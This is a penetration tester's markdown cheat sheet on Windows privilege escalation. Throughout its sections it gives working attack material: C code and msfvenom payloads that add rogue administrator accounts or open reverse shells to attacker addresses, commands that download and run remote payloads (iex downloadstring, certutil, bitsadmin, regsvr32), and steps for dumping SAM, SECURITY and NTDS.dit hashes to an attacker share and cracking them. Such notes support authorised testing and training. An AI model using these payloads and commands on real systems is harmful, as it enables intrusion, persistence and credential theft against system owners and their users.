# Windows

| [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [https://fuzzysecurity.com/tutorials/16.html](https://fuzzysecurity.com/tutorials/16.html)                                                                                                                                                                                     |
| [https://gist.github.com/siddicky/bf3a0a04c1fc8ea63b0aa0c78977726b](https://gist.github.com/siddicky/bf3a0a04c1fc8ea63b0aa0c78977726b)                                                                                                                                         |

## Situational Awareness

Enumerate host/system and then the AD environment as well

* Username and hostname
* Group memberships of the current user
* Existing users and groups -> `net user / Get-LocalUser / net localgroup / Get-LocalGroupMember $user/Administrators`
* Operating system, version and architecture
* Network information
* Installed applications
* Running processes

## Overview

{% code overflow="wrap" fullWidth="true" %}
```bash
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember $GROUP
net user $USER
net accounts (/domain)
runas /user:$USER cmd # Do we need GUI access to run this command??
# Check shared folders (SMB)
net share
# Check groups and privs
whoami /priv
# List running services
net start
wmic service where "name like 'SERVICE'" get Name,PathName
Get-Process -Name SERVICE
netstat -noa |findstr "LISTENING" |findstr "PORT" # to see if a service on a port is listening

# NOTE: in case the binary replaced does not run, grant full acess with icacls service.exe /grant Everyone:F

# Service Binary Hijacking (if the binary can be replaced and the service restarted, replace it for a malicious one)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike "C:\Windows\system*"}
Pay attention to services outside of C:\Windows\System32 which means are user-installed
Get-Service # this and above command are denied if not executed w/ admin rights or via GUI
net stop $SERVICE # if access denied, check Startup Type Automatic on the next command and SeShutdownPrivilege
# Then check if that "vulnerable" service can be overwritten
icacls "C:\folder\vulnerableservice.exe"
# Back up the original service before the replacement
move "C:\folder\vulnerableservice.exe" vulnerableservice.exe
move maliciousservice.exe "C:\folder\vulnerableservice.exe"
NOTE: We should always try to avoid issuing reboots on production systems in a real-life penetration test. A reboot could lead to unforeseeable problems and should only be issued in direct collaboration with the client IT staff.
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '$SERVICE'}
whoami /priv
shutdown /r /t 0

# Interesting accounts
- Administrators, Local System
- Built-in groups (Backup, Server, Printer Operators)
- Local/network service accounts
- Managed Service and Virtual Accounts
- Third party application users
- Misconfigured users

# Interesting privileges
- SeDebugPrivilege
Create a new process and set the parent process a privileged process
https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs#vulnerability
https://github.com/decoder-it/psgetsystem
- SeRestorePrivilege
Can write files anywhere, overwrites files, protected system files
Modify a service running as Local and startable by all users and get a SYSTEM shell
- SeBackupPrivilege
Can backup Windows registry and use third party tools for extracting local NTLM hashes
Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT
- SeTakeOwnershipPrivilege
Can take ownership of any securable object in the system
- SeTcbPrivilege
Can logon as a different user without any credentials in order to get a security Impersonation Token by using the LsaLogonUser() function
- SeCreateTokenPrivilege
Can create a custom token with all privileges and group membership you need (until Win 10 >= 1809)
But if you set the AuthenticationId to ANONYMOUS_LOGON_UID (0x3e6) you can always impersonate even in Win >=1809 and use a subset of API calls: CreateFile(), RegSetKey()
- SeLoadDriver Privilege
"Printer operators" have this privilege in the DC
Determines which users can dynamically load and unload device drivers or other code in to kernel mode
- SeImpersonatePrivilege & SeAssignPrimaryTokenPrivilege
Permit impersonate any access token
# ** If you have SeBackup & SeRestore privileges (Backup Operators group) you can set permission and ownership on each file & folder **


# Find Win version using cmdline if systeminfo access denied
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
C:\Windows\Temp is world writable
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # it is more reliable for OS version enum than other tools
whoami /priv
net user #--> to see uncommon users for instance
# ADD USER TO A GROUP
net group "Privileged IT Accounts" svc-alfresco /add /domain
# Services running > look for Windows Scheduler

# Reboot Windows with a delay and exit the terminal
shutdown -r -t 10 && exit


# NETWORKING INFO
# hostnames will include identifiable abbreviations such as web for a web server, db for a database server, dc for a domain controller, etc.
hostname # Identifying the role of a machine can help us focus our information gathering efforts.
# This information can help us determine if the compromised target is connected to multiple networks and therefore could be used as a pivot. In addition, the presence of specific virtual interfaces may indicate the existence of virtualization or antivirus software.
ipconfig /all
route print
netstat -ano # established connections that could reveal other users connected to this machine
# Check internal ports open
netstat -nat
netstat -abno
arp -a # IPs that communicated somehow with the system (attempt to connect, ping, etc.)

# Readable/Writable Files and Directories
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# Unmounted disks
mountvol # pay attention to GUIDs with no mount point as well

S-R-X-Y
The first part is a literal "S", which indicates that the string is a SID.
"R" stands for revision and is always set to "1", since the overall SID structure continues to be on its initial version.
"X" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies NT Authority and is used for local or domain users and groups.
"Y" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and relative identifier (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups.

# users and groups
NOTE: Pay attention to XXXadmin users or Backup groups since they usually have more privileges and are valuable targets
NOTE: Obtaining privileged access on every machine in a penetration test is rarely a useful or realistic goal. While most machines in the challenge labs of this course are rootable, we will face numerous non-rootable machines in real-life assessments. A skilled penetration tester's goal is therefore not to blindly attempt privilege escalation on every machine at any cost, but to identify machines where privileged access leads to further compromise of the client's infrastructure.
whoami

# OS, architecture, patches
systeminfo

# Scheduled Tasks
    As which user account (principal) does this task get executed?
    What triggers are specified f0r the task?
    What actions are executed when one or more of these triggers are met?
# Search for tasks run by SYSTEM or an admin user, also pay attention to Last Run Time and Next Run Time to check its periodicity
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
cat schtask.txt | grep "privilegeduser\|Task To Run" | grep -B 1 privilegeduser
# If the Task to Run is a .exe, we just replace it for ours and wait till the tasks is executed again
```
{% endcode %}

### WinPEAS & PowerSharpPack & other privesc checks

{% hint style="info" %}
Try Winpeas output as html
{% endhint %}

```bash
https://github.com/S3cur3Th1sSh1t/PowerSharpPack
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')
PowerSharpPack -winPEAS

windows-privesc-check2.exe -h
https://github.com/itm4n/PrivescCheck
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
winpeas.exe > outputfile.txt
https://github.com/itm4n/PrivescCheck
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
Metasploit -> multi/recon/local_exploit_suggester
```

Take into account that Watson scanning is included in WinPEAS.&#x20;

## Installed Apps / Patches

{% code overflow="wrap" fullWidth="true" %}
```bash
# Installed apps (check all)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Check C:\ / Program Files / Downloads directories
# Installed Applications and Patch Levels
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn

# LIST INSTALLED SOFTWARE
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
acceschk.exe (Sysinternals) https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
# ****Enumerating installed software versions via Registry
# List installed software on Windows
PS > Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName
# Check version for specific software
PS > Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {($_.DisplayName -eq "My Software")}
# If it does not appear here, check document files or inside Downloads folder.
```
{% endcode %}

## Weak File Permissions

{% code overflow="wrap" fullWidth="true" %}
```powershell
# CHECK RUNNING SERVICES
PS > Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
# IF THERE IS ANYTHING IN PROGRAM FILES OR OUT OF SYSTEM32 --> CHECK WITH
icacls $EXECUTABLE_PATH

# THEN CREATE THIS adduser.c FILE TO ADD A NEW ADMINISTRATOR
#include <stdlib.h> 
int main ()
{
	int i; 
	
	i = system ("net user evil Ev!lpass /add"); 
	i = system ("net localgroup administrators evil /add");
return 0; 
}

# COMPILE WITH
i686-w64-mingw32-gcc adduser.c -o adduser.exe
# RENAME THE ORIGINAL AND REPLACE IT WITH OURS
move file.exe file-original.exe
move adduser.exe file.exe
# RESTART THE SERVICE IF POSSIBLE
net stop $SERVICE
# If we cannot stop the service, we check if the service is set to "Automatic" to restart it when rebooting BY CHECKING "SESHUTDOWN PRIVILEGE"
wmic service where caption="$SERVICE" get name, caption, state, startmode
# Check if we have SeShutdown...
whoami /priv
# Note that the Disabled state only indicates if the privilege is currently enabled for the running process (if it appears, we have it no matter the state).
shutdown /r /t 0
# FINALLY CHECK IF THE NEW USER WAS ADDED
net localgroup Administrators
```
{% endcode %}

## **Service Escalation**

{% tabs %}
{% tab title="Registry" %}
#### [**https://github.com/sagishahar/scripts**](https://github.com/sagishahar/scripts)

{% code overflow="wrap" %}
```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# 1. get a list of all services 
accesschk64.exe -kvusw hklm\System\CurrentControlSet\services
powershell -nop -exec bypass -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | Format-List"
# 2. copy the list to a text editor vim/nano... 
# 3. search for following strings (based on powershell output)
    "NT AUTHORITY\INTERACTIVE Allow  FullControl" # (Everybody that logs in on physical computer, gets assigned to group INTERACTIVE)
    "BUILTIN\Users Allow  FullControl "
    "NT AUTHORITY\Authenticated Users FullControl"
    "Everyone Allow FullControl"
    other groups you are part of (whoami /all)
# ----create payload 
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o payload.exe
# place payload in writable folder 
cd C://Temp
cp //192.168.0.0/share/tmp/payload.exe .
# change registry path to executable (regsvc is an example) 
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\payload.exe /f
# restart service 
sc start regsvc
```
{% endcode %}
{% endtab %}

{% tab title="Executable" %}
{% code overflow="wrap" %}
```bash
# change Authenticated Users for any user/group that we want to escalate to
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# for each service, check  the permissions of the executable, if you have write / full access, overwrite executable with own payload
accesschk64.exe -wvu  "C:\Program Files\File Permissions Service"
# Query the service to see if it runs with SYSTEM/LocalSystem privileges (SERVICE_START_NAME).
sc qc filepermsvc
# Create your payload
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o payload.exe
# place payload in writable folder (in the example below, filepermservice.exe is the vulnerable executable)
cd "c:\Program Files\File Permissions Service"
cp //192.168.194.141/share/tmp/payload.exe .
mv payload.exe filepermservice.exe
# restart service 
sc start regsvc
```
{% endcode %}
{% endtab %}

{% tab title="DLL Hijacking" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Service DLL Hijacking (instead of overwriting the binary, we merely overwrite a DLL the service binary uses)
1 - Search a service.exe that is non-standard (usually) and even if we cannot modify it, look at it with Process Monitor
Filter > Operation > CreateFile
Filter > Result > NAME NOT FOUND
$env:path # to check the PATH and see if DLL search follows that order
# Important to find a DLL path that is writable for us

Standard DLL search order
1. The directory from which the application loaded. 
2. The system directory. 
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory. 
6. The directories that are listed in the PATH environment variable.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# If we cannot replace the binary or run Process Monitor on the target, copy/install the binary on our local machine and start Process Monitor there
- Filter Process Name is SERVICE.EXE 
# Then restart the service while Process Monitor is running in the background
Restart-Service Service 
# Check CreateFile if there is any calls to DLLs
# PoC for DLL that adds a new user to the Administrators group
#include &#x3C;stdlib.h> 
#include &#x3C;windows.h> 
BOOL APIENTRY DllMain( HANDLE hModule,// Handle to DLL module 
DWORD ul_reason_for_call,// Reason for calling function 
LPVOID lpReserved ) // Reserved 
{ 
	switch ( ul_reason_for_call ) 
	{ 
		case DLL_PROCESS_ATTACH: // A process is loading the DLL. 
		int i; 
		i = system ("net user dave2 password123! /add"); 
		i = system ("net localgroup administrators dave2 /add"); 
		break; 
		case DLL_THREAD_ATTACH: // A process is creating a new thread. 
		break; 
		case DLL_THREAD_DETACH: // A thread exits normally. 
		break; 
		case DLL_PROCESS_DETACH: // A process unloads the DLL. 
		break; 
	}
	return TRUE; 
}
# Cross-compile the C++ Code to a 64-bit DLL
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
# Once the DLL is placed on a directory where will be executed, restart the service
Restart-Service Service
<strong>
</strong><strong>
</strong><strong>
</strong><strong>https://attack.mitre.org/techniques/T1574/001/
</strong>#Check vulnerable services by following this guide:
http://www.fuzzysecurity.com/tutorials/16.html
# Check the path you are using 
echo %path%
# Check for all dirs in path what access rights you have (Python as example)
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"
# Check if any service is calling for DLL's that do not exist on the system
	# if you have RDP, you can use Process Monitor from the systinternals suite 
	# check in the registry if any dll is loaded ("ServiceDLL")
	# search for the location of the DLL
	dir wlbsctrl.dll /s
# check if the service restarts at boot time 
sc qc IKEEXT 
	START_TYPE:    2 AUTO_START
# generate malicious DLL
msfvenom windows/shell_reverse_tcp lhost=10.11.0.79 lport=9988 -o &#x3C;name of hijackable dll>.dll
# place dll in writable path folder
# reboot system / restart service
</code></pre>
{% endtab %}

{% tab title="binPath" %}
{% code overflow="wrap" %}
```bash
accesschk.exe /accepteula -uwcqv Users * # replace Users for any other privileged account we possess if so / also other nomenclatures such as Everyone, Authenticated Users...
 .\accesschk64.exe /accepteula -qlc WinService
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
# If I cannot list running services -> try to exploit VMTools or VSS services blindly??


#In case I can create my own service (if not, I will change an existing one)
sc.exe create $SERVICE_NAME binPath=""
#If I cannot and I have to use a running service -> list services
#If I cannot list running services -> use VMTools or VSS blindly

# Find all services (daclsvc as example) and check the "user" account's permissions:
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
# "user" account can change the service config (SERVICE_CHANGE_CONFIG)!!!
# Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
sc qc daclsvc
# Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
# Start a listener and then start the service to spawn a reverse shell:
net start daclsvc
```
{% endcode %}
{% endtab %}

{% tab title="Unquoted Path" %}
[**https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae**](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">C:\Program.exe 
C:\Program Files\My.exe 
C:\Program Files\My Program\My.exe 
C:\Program Files\My Program\My service\service.exe

# Search for services with spaces and without quotes
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike "C:\Windows\system*" -and $_.PathName -notlike '"*"*'}
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
# Before we go on, let’s check if we can start and stop the identified service
Start-Service Service
Stop-Service Service
# or
sc.exe stop windowsService
sc.exe start windowsService
# If so, check which of those paths is writable for us. Place the malicious binary and restart the service.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe-service -o rev-svc.exe
<strong>
</strong><strong>
</strong><strong># Check for services in which the executable paths don't contain quotes 
</strong>		wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
# do following checks for unquoted service paths: 
		# service runs under system (SERVICE_START_NAME: LocalSystem) 
		sc qc unquotedsvc 
		# extra verification if bin path is unquoted (BINARY_PATH_NAME)
		sc qc unquotedsvc 
		# you have write access to one of these directories
		icacls "C:\ "
		icacls "C:\Program Files"
		icacls "C:\Program Files\Unquoted Path Service"
# ---------------
# Choose the name of the exploit according to the paths the system will look for the binaries
    # in our example below, we have write access to the "C:\Program Files\Unquoted Path Service\" directory
    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
    # Therefore, we choose the name following binary name
    --> common.exe 
######## The path would be C:\Program.exe, C:\Program Files\Unquoted.exe, C:\Program Files\Unquoted Path Service\Common.exe and so on

# create exploit 
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o common.exe
# place exploit in the target folder, so in here 
C:\Program Files\Unquoted Path Service\
# restart service
sc start unquotedsvc
</code></pre>
{% endtab %}
{% endtabs %}

## Running processes

{% code overflow="wrap" fullWidth="true" %}
```c
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2
Get-Process
Get-Process MyProcessName | Format-List *
tasklist /v
# List running processes except svchost which repeats itself and it is not interesting (ps only on Meterpreter??)
ps | Where-Object {($_.ProcessName -ne "svchost")}
# If weird processes or common apps that are not usually running (browsers for example) -> dump info
https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
# Write a mini dump of a process named 'notepad' (only one match can exist):
C:\>procdump notepad
# Write a Full dump of a process with PID '4572':
C:\>procdump -ma 4572 -accepteula
# Then while we transfer the file to Kali, search for passwords for example
strings dump.dmp | grep -i password
```
{% endcode %}

## **Passwords / Loot**

[**https://pure.security/dumping-windows-credentials/**](https://pure.security/dumping-windows-credentials/)

{% tabs %}
{% tab title="LOOT" %}
<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># Loot, Search Files
</strong>Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.xlsm,*.doc,*.docx,*.docm,*.eml,*.bat,*.ini,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
# KEEPASS
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction 
SilentlyContinue
nxc smb &#x3C;ip> -u user -p pass -M keepass_discover
nxc smb &#x3C;ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse - ErrorAction SilentlyContinue # XAMPP
Get-ChildItem -Hidden -Path C:\Users\USER\Desktop\ # Hidden files 
If GUI > Event Viewer > Search Script Block Loggin events (applications > Windows > PowerShell > Operational > Event ID 4104

# PowerShell
Get-History
(Get-PSReadlineOption).HistorySavePath
# Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at 
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre>

[#keepass](../../enumeration/passwords.md#keepass "mention")
{% endtab %}

{% tab title="Browsers" %}
{% code overflow="wrap" %}
```bash
# https://thehacktoday.com/how-to-retrieve-decrypt-stored-passwords-in-firefox-chrome-remotely/
#VALID FOR BROWSER FIREFOX AND CHROME, FIREFOX EXAMPLE
Download important firefox files (logins.json, cert9.db, key4.db, cookies.sqlite...)
git clone https://github.com/unode/firefox_decrypt.git
python3 firefox_decrypt.py $FOLDER

https://github.com/AlessandroZ/LaZagne
https://github.com/S3cur3Th1sSh1t/PowerSharpPack
https://github.com/V1V1/SharpScribbles
https://github.com/lclevy/firepwd
```
{% endcode %}
{% endtab %}

{% tab title="Registry" %}
{% code overflow="wrap" %}
```bash
# Search for keys and values that contain "pass" or "password":
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
# Search also for privileged usernames on the local machine/domain
reg query HKLM /f adminuser /t REG_SZ /s

# Find AutoLogon credentials:
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
# On Kali, use the winexe command to spawn a command prompt running with creds
winexe -U 'admin%password' //MACHINE_IP cmd.exe
```
{% endcode %}
{% endtab %}

{% tab title="Creds" %}
{% code overflow="wrap" %}
```bash
# List any saved credentials:
cmdkey /list
# Use those creds to execute commands as that user:
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
{% endcode %}
{% endtab %}

{% tab title="Unattended" %}
```powershell
# If after using PowerUp.ps1 with the command Invoke-AllCheks we find this:
Check                                     AbuseFunction
-----                                     -------------
Unattended Install Files
# There are passwords stored in base64:
PS > type C:\Windows\Panther\Unattend\Unattended.xml
• C:\Unattend.xml
• C:\Windows\Panther\Unattend.xml
• C:\Windows\Panther\Unattend\Unattend.xml
• C:\Windows\system32\sysprep.inf
• C:\Windows\system32\sysprep\sysprep.xml
```
{% endtab %}

{% tab title="SYSVOL/GPP" %}
{% code overflow="wrap" %}
```bash
https://github.com/TheManticoreProject/FindGPPPasswords
https://github.com/t0thkr1s/gpp-decrypt

# Credentials in SYSVOL and Group Policy Preferences (GPP)
findstr /s /n /i /p password \\example.com\sysvol\example.com\*
mount.cifs -o domain=example.com,username=john,password="pass@123" //10.10.139.115/SYSVOL /mnt
grep -ir 'password' /mnt
```
{% endcode %}
{% endtab %}

{% tab title="SAM" %}
{% code overflow="wrap" %}
```bash
# Check Windows/System32/config to find SYSTEM and SAM 
samdump2 SYSTEM SAM
# ANOTHER OPTION --> pwdump.py SYSTEM SAM > sam.txt
# CRACK IT WITH JOHN
john --list=formats | grep -iF "md5"
john --format=NT --wordlist=rockyou.txt sam.txt
# ANOTHER WAY OF DUMPING THE FILES
This files are in use for the system, so copy them.
C:\>reg save HKLM\SAM SAM.backup
C:\>reg save HKLM\SYSTEM SYSTEM.backup
C:\>reg save HKLM\SECURITY SECURITY.backup
# Tranfer them to our Kali machine with smbserver.
copy SAM.backup \\10.10.14.20\share\SAM
copy SYSTEM.backup \\10.10.14.20\share\SYSTEM
# If we get SAM, SYSTEM and SECURITY (optional), we provide them to dump hashes 
secretsdump.py -sam $SAM [-security $SECURITY] -system $SYSTEM LOCAL
# copy all to a text file
hashcat -m 1000 --user hashes rockyou.txt
```
{% endcode %}
{% endtab %}

{% tab title="Others" %}
```
• C:\inetpub\wwwroot\web.config
• C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
{% endtab %}
{% endtabs %}

## **Scheduled tasks / Logged-on users**

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"># Check logged-on users
nxc smb serv01.testlab.local -u Administrator -p PASS --local-auth --loggedon-users
# Execute a command with user session
nxc smb serv01.testlab.local -u USER -p PASS --local-auth -M schtask_as -o USER=privileged.user CMD="powershell.exe \"Invoke-Command -ComputerName MYCOMPUTER -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Member unprivileged.user}\""
<strong>
</strong><strong>schtasks /query /fo LIST /v
</strong># Search for tasks run by Administrator, SYSTEM or any other user with admin rights. Also with next run time within minutes.
# Then see if we can overwrite that specific binary to replace for a malicious one and wait till the task is executed.
schtasks /run /tn vulntask # in case we can run the task
# on target
		#List all scheduled tasks with system privileges
		schtasks /query /fo LIST /v
# on kali
		#copy over list and check for tasks as system
		cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM	
# on target
# If we get a suspicious task, get more details and who runs it:
schtasks /query /fo LIST /v | select-string '$EXECUTABLE_NAME' -context 10
		# check if you have write access to executable to which the task points
		accesschk.exe -dqv "C:\Missing Scheduled Binary\"	
# Generate new payload
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o test.exe
# replace the task executable with our payload
# Do the same if we find a manual script run every X minutes that can be edited.
</code></pre>

## Special groups

[#privileged-groups](ad/#privileged-groups "mention")

## Special accounts

### Service account&#x20;

Might have $ at the end

### Computer account&#x20;

Has $ at the end

## Living Off the Land (LOLBAS)

It means take advantage of the built-in tools already installed on the target.

{% code overflow="wrap" fullWidth="true" %}
```csharp
# Sysinternals
https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
https://live.sysinternals.com/
Relevant ones: AccessChk, PSExec, ADExplorer, ProcDump, ProcMon, TCPView, PsTools, Portmon, Whois
# ADExplorer
https://krptyk.com/2023/10/22/adexplorer-tips/

# LOLBAS
https://lolbas-project.github.io/

# PROCMON
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

# File Operations
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
certutil -encode payload.exe Encoded-payload.txt
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

# File execution (Signed Binary Proxy Execution or Indirect Command Execution)
explorer.exe /root,"C:\Windows\System32\calc.exe"
wmic.exe process call create winPEASx64.exe # creates a new process of a binary of our choice
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");

# Application Whitelisting Bypasses 
    C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
    C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll # create DLL for 32 bits
# Now run one of the following two commands, the second one is more advanced
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
bash.exe -c calc.exe

# No PowerShell!
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1 # generate PS payload
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj

# CHANGE MACHINE/COMPUTER PASSWORD
Are you the local admin of a domain host but you don't want to dump its LSA secrets to read the machine account hash? You can change its password to whatever you want:
ksetup /setcomputerpassword <abcd>
The password gets set after a reboot, and now you have valid domain credentials without relying on password dumping techniques. The old password will keep working, at least until another password change. Also, notice how the password in the screenshot doesn't meet complexity requirements but is still accepted: machine account and trust passwords aren't subjected to complexity rules.
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ksetup-setcomputerpassword
```
{% endcode %}

## AlwaysInstalledElevated

**AlwaysInstallElevated** registry set to **1**. This means the installer uses elevated privileges which means MSI packages using SYSTEM level permissions

{% code overflow="wrap" %}
```bash
# Query the registry for AlwaysInstallElevated keys:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# We need any of the keys set to 1 (0x1).
# On Kali, generate a reverse shell Windows Installer (reverse.msi):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
# Upload the file, start a listener on Kali and run the installer:
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
{% endcode %}

## Privileged File Writes to RCE

[https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-privileged-file-write](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-privileged-file-write)

## Shadow Copies

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

{% code overflow="wrap" fullWidth="true" %}
```bash
C:\Tools>vshadow.exe -nw -p  C: # note Shadow copy device name:
# copy the whole AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy device name and adding the full ntds.dit path
C:\Tools>copy $SHADOW_COPY_DEVICE_NAME\windows\ntds\ntds.dit c:\ntds.dit.bak
#  to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry
C:\>reg.exe save hklm\system c:\system.bak
# Once the two .bak files are moved to our Kali machine, we can continue extracting the credential materials with secretsdump
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
# List shadow copies using diskshadow
diskshadow list shadows all
```
{% endcode %}

## Net-NTMLv2

